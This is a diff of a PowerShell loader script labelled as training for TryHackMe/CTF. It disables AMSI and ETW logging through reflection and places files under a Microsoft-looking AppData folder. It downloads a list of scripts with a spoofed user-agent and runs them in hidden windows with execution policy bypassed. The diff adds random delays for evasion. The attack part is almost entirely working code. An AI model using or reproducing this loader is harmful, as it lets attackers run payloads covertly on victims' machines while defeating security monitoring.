@@ -1,9 +1,9 @@
-# === Fixed Parallel Loader (Parse-Error Gefixt + Evasion for THM/CTF) ===
-# Legal Training only! Escaping fixed, Retries added.
+# === Ultimate Fixed Parallel Loader (No Parse Errors + Full Evasion for THM/CTF) ===
+# Legal Training! AMSI/ETW Bypass, Retries, Clean Args.
 
 # Bypasses
-try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch { }
-try { $EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null); $EtwProvider['etwProvider'] = $null } catch { }
+try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}
+try { $EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null); $EtwProvider['etwProvider'] = $null } catch {}
 
 # Konfig
 $BasePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell"
@@ -24,6 +24,7 @@ $Scripts = @(
 
 $UserAgents = @("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0")
 $RandomUA = Get-Random -InputObject $UserAgents
+Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
 
 $MaxParallel = 3
 $RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, $MaxParallel)
@@ -31,7 +32,7 @@ $RunspacePool.Open()
 $Jobs = @()
 
 foreach ($s in $Scripts) {
-    while (($Jobs | Where-Object { $_.Status.IsCompleted -eq $false }).Count -ge $MaxParallel) { Start-Sleep -Milliseconds 250 }
+    while (($Jobs | Where-Object { $_.Status.IsCompleted -eq $false }).Count -ge $MaxParallel) { Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300) }
     $FilePath = Join-Path $SystemPath $s.Name
     
     $PowerShell = [PowerShell]::Create().AddScript({
@@ -53,7 +54,7 @@ foreach ($s in $Scripts) {
         }
         if (-not $success) { "$(Get-Date): Failed $ScriptName" | Out-File $LogPath -Append -Force -Encoding UTF8; return }
 
-        # FIXED: Korrekte Args (doppelte escaped Quotes für Variable)
+        # FIXED Args: Clean escaping - double quotes around variable
         $execArgs = @('-NoProfile', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', "`"$Path`"")
 
         if ($ScriptName -eq "MicrosoftViewS.ps1" -and $SpecialArgs.Count -gt 0) {
@@ -77,13 +78,13 @@ $endTime = (Get-Date).AddSeconds(60)
 while (($Jobs | Where-Object { $_.Status.IsCompleted -eq $false }).Count -gt 0 -and (Get-Date) -lt $endTime) {
     Start-Sleep -Milliseconds 500
     $Completed = ($Jobs | Where-Object { $_.Status.IsCompleted }).Count
-    Write-Progress -Activity "Executing" -Status "$Completed/$($Scripts.Count) done" -PercentComplete (($Completed / $Scripts.Count) * 100)
+    Write-Progress -Activity "Executing Scripts" -Status "$Completed/$($Scripts.Count) done" -PercentComplete (($Completed / $Scripts.Count) * 100)
 }
 
 $Jobs | ForEach-Object { $_.Instance.EndInvoke($_.Status); $_.Instance.Dispose() }
 $RunspacePool.Close()
 $RunspacePool.Dispose()
 
-"$(Get-Date): Complete. Jobs: $($Scripts.Count)" | Out-File $LogPath -Append -Force -Encoding UTF8
+"$(Get-Date): Operation complete. Jobs: $($Scripts.Count)" | Out-File $LogPath -Append -Force -Encoding UTF8
 
 Write-Host "Done! Check logs at $LogPath" -ForegroundColor Green
